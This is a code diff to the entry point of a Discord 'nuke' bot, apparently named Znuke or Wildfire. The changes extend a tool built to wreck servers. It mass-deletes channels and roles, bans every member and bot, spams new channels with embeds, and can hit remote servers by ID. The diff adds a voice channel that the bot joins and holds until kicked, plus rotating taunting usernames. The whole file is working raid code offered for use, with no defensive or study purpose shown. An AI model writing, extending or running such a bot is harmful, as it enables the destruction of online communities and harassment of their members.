@@ -1,7 +1,7 @@
 // src/index.js — Bot entry point
 //
 // Usage:
-//   znuke                 → full nuke current server (ban all + bots)
+//   znuke                 → full nuke current server (ban all + create VC)
 //   znuke <server_id>     → full nuke remote server
 //   znuke manager         → open Znuke Manager (single modal, all options)
 
@@ -18,8 +18,14 @@ import {
   ModalBuilder,
   TextInputBuilder,
   TextInputStyle,
+  ChannelType,
 } from 'discord.js';
-import { nukeServer, buildNukeEmbed } from './commands/nuke.js';
+import {
+  joinVoiceChannel,
+  VoiceConnectionStatus,
+  entersState,
+} from '@discordjs/voice';
+import { nukeServer, buildNukeEmbed, buildVcNukeEmbed } from './commands/nuke.js';
 
 // ─── Owner whitelist ───────────────────────────────────────────────────────────
 const ALLOWED_IDS = new Set(
@@ -34,6 +40,55 @@ const PREFIX = 'znuke';
 // ─── Deduplication guard ───────────────────────────────────────────────────────
 const handledMessages = new Set();
 
+// ─── Active voice connections (guildId → VoiceConnection) ─────────────────────
+const activeVoiceConnections = new Map();
+
+// ─── Helper: join a VC and never leave until kicked ───────────────────────────
+// On a network blip, the connection auto-reconnects.
+// If the bot is kicked / channel deleted, the connection is destroyed cleanly.
+async function joinAndStay(vcChannel, guild) {
+  // Kill any existing connection for this guild
+  const existing = activeVoiceConnections.get(guild.id);
+  if (existing) {
+    try { existing.destroy(); } catch { /* ignore */ }
+    activeVoiceConnections.delete(guild.id);
+  }
+
+  const connection = joinVoiceChannel({
+    channelId:      vcChannel.id,
+    guildId:        guild.id,
+    adapterCreator: guild.voiceAdapterCreator,
+    selfDeaf:       true,
+    selfMute:       true,
+  });
+
+  activeVoiceConnections.set(guild.id, connection);
+
+  // When disconnected, try to detect if it's a network blip or a real kick
+  connection.on(VoiceConnectionStatus.Disconnected, async () => {
+    try {
+      // If the connection enters Signalling/Connecting within 5 s it is auto-reconnecting
+      await Promise.race([
+        entersState(connection, VoiceConnectionStatus.Signalling,  5_000),
+        entersState(connection, VoiceConnectionStatus.Connecting,  5_000),
+      ]);
+      // Reconnecting — nothing to do
+    } catch {
+      // Could not reconnect — bot was kicked or channel was deleted → clean up
+      if (connection.state.status !== VoiceConnectionStatus.Destroyed) {
+        connection.destroy();
+      }
+      activeVoiceConnections.delete(guild.id);
+    }
+  });
+
+  connection.on(VoiceConnectionStatus.Destroyed, () => {
+    activeVoiceConnections.delete(guild.id);
+  });
+
+  return connection;
+}
+
 // ─── Client ───────────────────────────────────────────────────────────────────
 const client = new Client({
   intents: [
@@ -42,6 +97,7 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.DirectMessages,
+    GatewayIntentBits.GuildVoiceStates,   // required for @discordjs/voice
   ],
   partials: [Partials.Channel],
 });
@@ -78,6 +134,10 @@ async function sendManagerEmbed(channel) {
         '`2` — **Ban All** — Ban every member & bot in the server',
         '`3` — **Wipe All** — Delete everything + ban all + create spam channels',
         '',
+        '**VC Mode:** Append `v` to the channel count to create a Voice Channel at the top.',
+        '> `100v` → 1 VC + 99 text channels · `1v` → 1 VC only',
+        '> Bot joins the VC immediately and stays until kicked.',
+        '',
         '> Click **Launch Manager** to open the control panel.',
       ].join('\n'),
     )
@@ -102,7 +162,7 @@ client.once(Events.ClientReady, (c) => {
   console.log(`👑  Authorised users: ${[...ALLOWED_IDS].join(', ') || 'NONE SET'}\n`);
 
   // ─── Rotating watching status ─────────────────────────────────────────────
-  const statuses = [
+  const watchStatuses = [
     'Wildfire | Armed',
     'Wildfire | Wreckage',
     'Wildfire | Devastation',
@@ -110,18 +170,39 @@ client.once(Events.ClientReady, (c) => {
     'Wildfire | Collapse',
     'Wildfire | Ur Fxther',
   ];
-  let statusIndex = 0;
+  let watchIndex = 0;
 
-  const setStatus = () => {
+  const setWatchStatus = () => {
     c.user.setPresence({
-      activities: [{ name: statuses[statusIndex], type: 3 }], // 3 = Watching
+      activities: [{ name: watchStatuses[watchIndex], type: 3 }], // 3 = Watching
       status: 'dnd',
     });
-    statusIndex = (statusIndex + 1) % statuses.length;
+    watchIndex = (watchIndex + 1) % watchStatuses.length;
   };
+  setWatchStatus();
+  setInterval(setWatchStatus, 5_000);
 
-  setStatus(); // set immediately on ready
-  setInterval(setStatus, 5_000);
+  // ─── Rotating bot username ─────────────────────────────────────────────────
+  // Discord allows ~2 renames/hour. We attempt every 5 s and silently skip
+  // the cycle when rate-limited so the bot never crashes.
+  const botNames = [
+    'Wildfire | Armed',
+    'Wildfire | Wreckage',
+    'Wildfire | Devastation',
+    'Wildfire | Chaos',
+    'Wildfire | Collapse',
+    'Wildfire | Ur Fxther',
+  ];
+  let nameIndex = 0;
+
+  setInterval(async () => {
+    try {
+      await c.user.setUsername(botNames[nameIndex]);
+      nameIndex = (nameIndex + 1) % botNames.length;
+    } catch {
+      // Rate-limited or API error — skip this cycle silently
+    }
+  }, 5_000);
 });
 
 // ─── Message handler ──────────────────────────────────────────────────────────
@@ -193,7 +274,7 @@ client.on(Events.MessageCreate, async (message) => {
         .setDescription(
           [
             `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
-            `**Action:** 🔨 Ban All (members + bots)`,
+            `**Action:** 🔨 Ban All (members + bots) + 🔊 VC creation`,
             isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
             '',
             'Type **`confirm`** within 30 seconds to proceed.',
@@ -223,7 +304,15 @@ client.on(Events.MessageCreate, async (message) => {
   });
 
   try {
-    const log = await nukeServer(targetGuild, client.user.id);
+    // Direct znuke always creates a VC (count=0 → only VC, no spam text channels)
+    const { log, vcChannel } = await nukeServer(
+      targetGuild, client.user.id, 0, 'nuked', true, 'wildfire-base',
+    );
+
+    // Join the VC and stay
+    if (vcChannel) {
+      joinAndStay(vcChannel, targetGuild).catch(() => {});
+    }
 
     const resultEmbed = new EmbedBuilder()
       .setColor(0x2b2d31)
@@ -232,8 +321,8 @@ client.on(Events.MessageCreate, async (message) => {
       .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
       .setTimestamp();
 
-    // Send in channel (may be gone) + always DM the invoker
     await safeSend(reportChannel, invoker, { embeds: [resultEmbed] });
+
     try {
       const dm = await invoker.createDM();
       await dm.send({
@@ -283,7 +372,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
   }
 
   // ─────────────────────────────────────────────────────────────────────────
-  // BUTTON: Launch Manager → open the single unified modal
+  // BUTTON: Launch Manager → open the unified modal
   // ─────────────────────────────────────────────────────────────────────────
   if (interaction.isButton() && interaction.customId === 'manager_open') {
     const modal = new ModalBuilder()
@@ -291,7 +380,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
       .setTitle('Znuke Manager');
 
     modal.addComponents(
-      // Field 1: Server ID (optional — blank = current server)
+      // Field 1: Server ID (optional)
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('server_id')
@@ -307,11 +396,11 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
-      // Field 3: Channels to Create
+      // Field 3: Channels — append 'v' for VC (e.g. 100v, 1v)
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('channels_count')
-          .setLabel('Channels to Create (0-500)')
+          .setLabel('Channels (add v for VC: 100v · 1v=VC only)')
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
@@ -323,7 +412,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
-      // Field 5: CONFIRM — only field with a placeholder
+      // Field 5: CONFIRM
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('confirm')
@@ -351,9 +440,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     const serverIdInput = interaction.fields.getTextInputValue('server_id').trim();
     const mode          = interaction.fields.getTextInputValue('mode').trim();
-    const rawCount      = interaction.fields.getTextInputValue('channels_count').trim();
+    const rawCount      = interaction.fields.getTextInputValue('channels_count').trim().toLowerCase();
     const channelName   = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';
-    const count         = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
+
+    // Parse VC toggle: 'v' suffix → e.g. "100v" → count=100, createVc=true
+    // parseInt('100v', 10) === 100  (stops at first non-digit — intentional)
+    const createVc  = rawCount.endsWith('v');
+    const count     = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
+    // Text channels = count − 1 (VC takes 1 slot); 0 if only 1 slot requested
+    const textCount = createVc ? Math.max(count - 1, 0) : count;
 
     // Validate mode
     if (!['1', '2', '3'].includes(mode)) {
@@ -363,8 +458,8 @@ client.on(Events.InteractionCreate, async (interaction) => {
       }).catch(() => {});
     }
 
-    // ── Resolve target guild (remote or current) ──────────────────────────
-    let targetGuild = guild; // default: current server
+    // ── Resolve target guild ───────────────────────────────────────────────
+    let targetGuild = guild;
     let isRemote    = false;
 
     if (serverIdInput && serverIdInput !== guild.id) {
@@ -392,7 +487,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
               `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
               isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
               `**Mode:** \`${modeLabel}\``,
-              mode !== '2' ? `**Channels:** \`${count}\` × \`${channelName}\`` : '',
+              mode !== '2'
+                ? `**Channels:** \`${count}\`${createVc ? ' (1 VC + ' + textCount + ' text)' : ''} × \`${channelName}\``
+                : '',
+              createVc ? '🔊 **VC:** Bot will join and hold position.' : '',
               '> Running all tasks simultaneously…',
             ].filter(Boolean).join('\n'),
           )
@@ -402,50 +500,73 @@ client.on(Events.InteractionCreate, async (interaction) => {
     }).catch(() => {});
 
     const log = [];
+    let vcChannel = null;
 
     try {
       // ── MODE 1: Chan & Role ──────────────────────────────────────────────
-      // Step A: delete all existing channels first
-      // Step B: create spam channels + delete roles in parallel
       if (mode === '1') {
         // A — wipe existing channels
         const existingChs = targetGuild.channels.cache.map((ch) => ch.delete().catch(() => {}));
         const delResults  = await Promise.allSettled(existingChs);
-        const delOk = delResults.filter((r) => r.status === 'fulfilled').length;
+        const delOk       = delResults.filter((r) => r.status === 'fulfilled').length;
         log.push(`🗑️ **Old Channels Wiped** — \`${delOk}\` deleted`);
 
-        // B — create spam channels + delete roles (parallel)
-        const [chanResult, roleResult] = await Promise.allSettled([
-          (async () => {
-            const tasks = Array.from({ length: count }, async () => {
-              try {
-                const ch = await targetGuild.channels.create({ name: channelName });
-                if (ch && typeof ch.send === 'function') {
-                  await ch.send({ embeds: [buildNukeEmbed(channelName)] }).catch(() => {});
-                }
-              } catch { /* ignore */ }
+        // B — create VC first if requested (position 0 = top)
+        if (createVc) {
+          try {
+            vcChannel = await targetGuild.channels.create({
+              name:     channelName,
+              type:     ChannelType.GuildVoice,
+              position: 0,
             });
-            const results = await Promise.allSettled(tasks);
-            const ok = results.filter((r) => r.status === 'fulfilled').length;
-            return `📣 **Channels Created** — \`${ok}\` created (\`${channelName}\`)`;
-          })(),
+            await vcChannel.setPosition(0, { relative: false }).catch(() => {});
+            await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
+            log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
+          } catch (err) {
+            log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
+          }
+        }
+
+        // C — create spam text channels + delete roles (parallel)
+        const parallelTasks = [];
+
+        if (textCount > 0) {
+          parallelTasks.push(
+            (async () => {
+              const tasks = Array.from({ length: textCount }, async () => {
+                try {
+                  const ch = await targetGuild.channels.create({ name: channelName });
+                  if (ch && typeof ch.send === 'function') {
+                    await ch.send({ embeds: [buildNukeEmbed(channelName)] }).catch(() => {});
+                  }
+                } catch { /* ignore */ }
+              });
+              const results = await Promise.allSettled(tasks);
+              const ok      = results.filter((r) => r.status === 'fulfilled').length;
+              return `📣 **Channels Created** — \`${ok}\` created (\`${channelName}\`)`;
+            })(),
+          );
+        }
+
+        parallelTasks.push(
           (async () => {
             const botMember  = await targetGuild.members.fetch(client.user.id);
             const botTopRole = botMember.roles.highest.position;
             const roles      = targetGuild.roles.cache.filter(
               (r) => r.id !== targetGuild.id && r.position < botTopRole,
             );
-            const tasks   = roles.map((r) => r.delete().catch(() => {}));
-            const results = await Promise.allSettled(tasks);
-            const ok = results.filter((r) => r.status === 'fulfilled').length;
+            const roleTasks = roles.map((r) => r.delete().catch(() => {}));
+            const results   = await Promise.allSettled(roleTasks);
+            const ok        = results.filter((r) => r.status === 'fulfilled').length;
             return `🎭 **Roles Deleted** — \`${ok}\` deleted`;
           })(),
-        ]);
+        );
 
-        if (chanResult.status === 'fulfilled') log.push(chanResult.value);
-        else log.push('📣 **Channels** — failed');
-        if (roleResult.status === 'fulfilled') log.push(roleResult.value);
-        else log.push('🎭 **Roles** — failed');
+        const settled = await Promise.allSettled(parallelTasks);
+        settled.forEach((r) => {
+          if (r.status === 'fulfilled') log.push(r.value);
+          else log.push(`❌ Task failed: \`${r.reason?.message}\``);
+        });
       }
 
       // ── MODE 2: Ban All ──────────────────────────────────────────────────
@@ -457,17 +578,41 @@ client.on(Events.InteractionCreate, async (interaction) => {
         );
         const ok = results.filter((r) => r.status === 'fulfilled').length;
         log.push(`🔨 **Members Banned** — \`${ok}\` banned (including bots)`);
+
+        // Create VC after banning if requested
+        if (createVc) {
+          try {
+            vcChannel = await targetGuild.channels.create({
+              name:     channelName,
+              type:     ChannelType.GuildVoice,
+              position: 0,
+            });
+            await vcChannel.setPosition(0, { relative: false }).catch(() => {});
+            await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
+            log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created`);
+          } catch (err) {
+            log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
+          }
+        }
       }
 
       // ── MODE 3: Wipe All ─────────────────────────────────────────────────
       if (mode === '3') {
-        const nukeLog = await nukeServer(targetGuild, client.user.id, count, channelName);
-        log.push(...nukeLog);
+        const result = await nukeServer(
+          targetGuild, client.user.id, count, channelName, createVc, channelName,
+        );
+        log.push(...result.log);
+        vcChannel = result.vcChannel;
       }
 
     } catch (err) {
       console.error('[manager modal] Error:', err.message);
       log.push(`❌ Error: \`${err.message}\``);
+    }
+
+    // ── Join VC if one was created ─────────────────────────────────────────
+    if (vcChannel) {
+      joinAndStay(vcChannel, targetGuild).catch(() => {});
     }
 
     await interaction.followUp({
@@ -492,9 +637,9 @@ client.on(Events.InteractionCreate, async (interaction) => {
             .setTitle('📋 Nuke Report — DM Copy')
             .setDescription(log.join('\n') || 'No actions were performed.')
             .addFields(
-              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`,      inline: false },
-              { name: 'Mode',          value: `${mode} — ${modeLabel}`,                             inline: true  },
-              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',                 inline: true  },
+              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`,       inline: false },
+              { name: 'Mode',          value: `${mode} — ${modeLabel}`,                              inline: true  },
+              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',                  inline: true  },
               { name: 'Executed By',   value: `<@${interaction.user.id}> (${interaction.user.tag})`, inline: false },
             )
             .setFooter({ text: 'WildfireX Security' })
